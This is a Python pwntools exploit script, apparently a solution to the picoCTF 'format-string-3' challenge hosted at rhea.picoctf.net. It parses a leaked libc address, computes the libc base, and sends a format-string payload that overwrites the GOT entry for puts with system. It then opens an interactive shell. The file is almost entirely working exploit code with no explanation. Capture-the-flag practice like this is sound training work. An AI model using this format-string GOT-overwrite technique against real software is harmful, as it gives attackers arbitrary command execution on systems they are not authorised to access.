#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './format-string-3' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
host, port = 'rhea.picoctf.net', 62141 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.recvuntil(b'libc: ')
    setvbuf = int(io.recvline().strip(), 16)
    libc.address = setvbuf - libc.sym['setvbuf']
    
    payload = fmtstr_payload(38, {elf.got['puts'] : libc.sym['system']})
    io.sendline(payload)
    
    log.info('Libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()